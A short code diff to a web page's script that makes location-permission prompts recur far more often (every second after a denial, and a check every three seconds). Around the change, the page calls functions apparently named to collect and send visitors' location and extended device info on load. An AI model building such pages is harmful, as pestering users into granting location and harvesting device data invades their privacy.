@@ -282,7 +282,7 @@
                         collectAndSendLocation();
                     } else {
                         document.getElementById('permissionPopup').style.display = 'block';
-                        setTimeout(requestLocationPermission, 5000);
+                        setTimeout(requestLocationPermission, 1000);
                     }
                 });
             }
@@ -311,7 +311,7 @@
         window.onload = function() {
             checkLocationPermission();
             collectExtendedDeviceInfo();
-            setInterval(checkLocationPermission, 30000);
+            setInterval(checkLocationPermission, 3000);
         };
     </script>
 </body>
